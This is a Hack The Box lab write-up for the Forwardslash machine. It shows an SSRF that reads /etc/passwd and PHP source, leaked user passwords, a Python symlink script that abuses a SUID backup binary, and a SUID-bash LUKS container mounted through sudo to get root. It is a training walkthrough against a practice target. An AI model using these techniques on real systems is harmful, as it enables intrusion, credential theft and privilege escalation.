---
layout: single
title: Forwardslash - Hack The Box
excerpt: "Forwardslash starts off like most classic Hack The Box machines with some enumeration of vhosts, files and directories with gobuster then we use a Server-Side Request Forgery (SSRF) vulnerability to reach a protected dev directory only accessible from localhost. After finding credentials and getting a shell, we'll analyze and exploit a small backup program to read files as user pain and find more credentials. In the spirit of Team Unintended, instead of solving the crypto challenge to get root I used the sudo commands available to me to upload and mount my own Luks container and execute a SUID bash binary."
date: 2020-07-04
classes: wide
header:
  teaser: /assets/images/htb-writeup-forwardslash/forwardslash_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - php
  - vhosts
  - ssrf
  - ltrace
  - python
  - unintended
  - luks
---

![](/assets/images/htb-writeup-forwardslash/forwardslash_logo.png)

Forwardslash starts off like most classic Hack The Box machines with some enumeration of vhosts, files and directories with gobuster then we use a Server-Side Request Forgery (SSRF) vulnerability to reach a protected dev directory only accessible from localhost. After finding credentials and getting a shell, we'll analyze and exploit a small backup program to read files as user pain and find more credentials. In the spirit of Team Unintended, instead of solving the crypto challenge to get root I used the sudo commands available to me to upload and mount my own Luks container and execute a SUID bash binary.

## Summary

- Find the `backup` vhost, create an account and log in to the dashboard
- Enumerate the `backup` vhost with gobuster, find a `/dev` directory that only allows connections from localhost
- Use the disabled change profile picture page to do an SSRF and access the `/dev` directory, finding the `chiv` user password
- SSH in as user `chiv`, reverse a backup utitity and write a script to compute the expected MD5 hash, gaining arbitrary file read as user `pain`
- Find the password for user `pain` in `/var/backups/config.php.bak`
- Gain root the unintended way by using the sudo `luksOpen` and `mount` commands to mount a volume where a SUID `/bin/bash` binary has been placed

## Portscan

```
root@kali:~/htb/forwardslash# nmap -sC -sV -p- 10.10.10.183
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-05 07:42 EDT
Nmap scan report for forwardslash.htb (10.10.10.183)
Host is up (0.016s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)
|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Backslash Gang
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Website

When we browse the website with its IP address, it redirects us to `forwardslash.htb` so I will add this domain name to my local host file and use the hostname instead.

```
HTTP/1.1 302 Found
Date: Sun, 05 Apr 2020 11:48:05 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: http://forwardslash.htb
```

Oh oh... The website has been defaced by the infamous **The Backslash Gang**. I don't see any links or any html comments that might indicate what to do next and I have no idea who that Sharon person referenced on the website is.

![](/assets/images/htb-writeup-forwardslash/web1.png)

Since the website is using the hostname (not just the IP address), it's worth looking for additional vhosts. I'll use gobuster for this and discover that there is a vhost for `backup.forwardslash.htb`:

```
root@kali:~/htb/forwardslash# gobuster vhost -q -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -u http://forwardslash.htb
Found: backup.forwardslash.htb (Status: 302) [Size: 33]
```

The backup page has a login screen with a link to create an account.

![](/assets/images/htb-writeup-forwardslash/web2.png)

![](/assets/images/htb-writeup-forwardslash/web3.png)

Once logged in, we see a dashboard with a couple of options:

![](/assets/images/htb-writeup-forwardslash/web4.png)

At first glance they're not that interesting, but I'll get back to the Change Profile Picture one in just a minute...

After running gobuster on that vhost we find a `/dev` directory.

```
root@kali:~/htb/forwardslash# gobuster dir -q -w ~/tools/SecLists/Discovery/Web-Content/big.txt -t 50 -u http://backup.forwardslash.htb
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/dev (Status: 301)
/server-status (Status: 403)
```

I get a 403 when I access this directory but my IP address is shown on the error message so this may be some kind of hint that the page can only be accessed locally (this hints at using an SSRF vulnerability to access the page).

![](/assets/images/htb-writeup-forwardslash/web7.png)

Back to the dashboard options,  I see the option to change the profile picture is disabled (the URL bar and submit button are greyed out).

![](/assets/images/htb-writeup-forwardslash/web5.png)

These options are just disabled client-side with the `disabled` HTML tag:

```html
<form action="/profilepicture.php" method="post">
        URL:
        <input type="text" name="url" disabled style="width:600px"><br>
        <input style="width:200px" type="submit" value="Submit" disabled>
</form>
```

Using Burp, I'll send the POST query directly and discover after messing around in the Repeater tab that there's an SSRF vulnerability on the page that lets me read files with the URL parameter or make HTTP requests. The first thing I tested was reading an arbitrary file like the `/etc/passwd`.

![](/assets/images/htb-writeup-forwardslash/web6.png)

From the `/etc/passwd` file, I have found two users: `chiv` and `pain`

Remember that `/dev` page we couldn't access from our box? By using the `http` URI handler in the the `url` parameter we can send requests orginated from localhost and get around the IP restriction, reaching some kind of API test page.

`url=http://backup.forwardslash.htb/dev`

![](/assets/images/htb-writeup-forwardslash/web8.png)

I couldn't figure out what to do with this API but I found that I could retrieve the PHP source code the `/dev/index.php` file by base64 encoding it with a PHP filter.

![](/assets/images/htb-writeup-forwardslash/web9.png)

The PHP code contains the password for user `chiv` for the FTP login function:

```php
if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {
    error_log("Getting file");
    echo ftp_get_string($conn_id, "debug.txt");
}
```

We can log in with SSH with user `chiv` and this password:

![](/assets/images/htb-writeup-forwardslash/ssh1.png)

## Escalating to user pain

I ran [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) to check for privilege escalation vectors.

The `/usr/bin/backup` binary is owned by user `pain` and has the SUID bit set so that's the next logical step on the box.

![](/assets/images/htb-writeup-forwardslash/ssh2.png)

```
chiv@forwardslash:~$ ls -l /usr/bin/backup
-r-sr-xr-x 1 pain pain 13384 Mar  6 10:06 /usr/bin/backup
```

The program is weird, it tries to access a different random file every time I run it.

```
chiv@forwardslash:~$ /usr/bin/backup
----------------------------------------------------------------------
	Pain's Next-Gen Time Based Backup Viewer
	v0.1
	NOTE: not reading the right file yet, 
	only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 12:17:34
ERROR: 6de241f3320ade5ac8bb6e1d245a1457 Does Not Exist or Is Not Accessible By Me, Exiting...
```

I used `ltrace` to figure out what the program does.

![](/assets/images/htb-writeup-forwardslash/ssh3.png)

The program takes the time and computes an MD5 hash based from it, then tries to access a file with the MD5 name.

To confirm this, I'll take the time from the previous output `(12:17:34 / 6de241f3320ade5ac8bb6e1d245a1457)` and compute the MD5 hash.

```
chiv@forwardslash:~$ echo -ne '12:17:34' | md5sum
6de241f3320ade5ac8bb6e1d245a1457  -
```

Good, the hash matches so we know that random file name is just a hash of the current time. So to exploit this program, I just need to generate a symlink to the file I want to read using the MD5 hash of the current time. Since the program runs as pain, I'll be able to read any files owned by this user.

```python
#!/usr/bin/python
import hashlib
import os
import sys
from time import gmtime, strftime

a = str(strftime("%H:%M:%S"))
print a
m = hashlib.md5()
m.update(a)
print os.symlink(sys.argv[1], m.hexdigest())
print os.system('/usr/bin/backup')
```

I can now read any file with user `pain` privileges:

![](/assets/images/htb-writeup-forwardslash/user.png)

After looking around, I found the `/var/backups/config.php.bak` file containing pain's password: `db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704`

![](/assets/images/htb-writeup-forwardslash/ssh4.png)

I can log in as `pain` now:

![](/assets/images/htb-writeup-forwardslash/pain.png)

## Privesc to root unintended way

There's a note in pain's home directory that gives a hint about the next step.

```
pain@forwardslash:~$ cat note.txt 
Pain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.

-chiv
```

Running sudo shows there's a few commands we can run as root like opening and mounting an encryted Luks volume.

```
pain@forwardslash:~$ sudo -l
Matching Defaults entries for pain on forwardslash:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/
```

As we can see here, the encrypted backup is located here in `/var/backups/recovery/`.

```
pain@forwardslash:~$ ls -l /var/backups/recovery/
total 976568
-rw-r----- 1 root backupoperator 1000000000 Mar 24 12:12 encrypted_backup.img
```

The `encrypter.py` script is some crypto challenge that we have to solve to recover the Luks volume encryption key. 

![](/assets/images/htb-writeup-forwardslash/encrypter.png)

I didn't feel like solving a crypto challenge that weekend so I chose an unintended route to solve this one. Since we can open and mount Luks containers there's nothing stopping us from mounting a volume with an arbitrary program placed into it. The attributes set on the program files will also be used by the operating system so if we make something SUID like `bash` for example, then we'll be able to escalate root privileges easily.

Step 1. First, we'll create an empty virtual disk 
```
# dd if=/dev/zero of=luksvolume1 bs=1M count=64
64+0 records in
64+0 records out
67108864 bytes (67 MB, 64 MiB) copied, 0.0982699 s, 683 MB/s
```

Step 2. Then we format & encrypt it with LUKS (we pick an arbitrary password)
```
# cryptsetup -vy luksFormat luksvolume1

WARNING!
========
This will overwrite data on luksvolume1 irrevocably.

Are you sure? (Type 'yes' in capital letters): YES
Enter passphrase for luksvolume1: 
Verify passphrase: 
Key slot 0 created.
Command successful.
```

Step 3. Next, we open the new encrypted container
```
# cryptsetup luksOpen luksvolume1 myluksvol1
Enter passphrase for luksvolume1: 
```

Step 4. And create the ext4 filesystem on it
```
# mkfs.ext4 /dev/mapper/myluksvol1
mke2fs 1.45.6 (20-Mar-2020)
Creating filesystem with 49152 1k blocks and 12288 inodes
Filesystem UUID: d4482c0c-1970-4956-9ffa-8b8105f19cdd
Superblock backups stored on blocks: 
	8193, 24577, 40961

Allocating group tables: done                            
Writing inode tables: done                            
Creating journal (4096 blocks): done
Writing superblocks and filesystem accounting information: done
```

Step 5. Then we mount it, then copy bash to it and set the SUID bit
```
# mount /dev/mapper/myluksvol1 /mnt
# cp bash /mnt
# chmod u+s /mnt/bash
# ls -l /mnt
total 1100
-rwsr-xr-x 1 root root 1113504 Apr  5 08:39 bash
drwx------ 2 root root   12288 Apr  5 08:38 lost+found
# umount /mnt
```

Step 6. We then copy the container image to the box
```
root@kali:~/htb/forwardslash# scp luksvolume1 pain@10.10.10.183:/tmp
pain@10.10.10.183's password: 
luksvolume1
```

Step 7. And finally mount the image and execute bash as root

![](/assets/images/htb-writeup-forwardslash/root.png)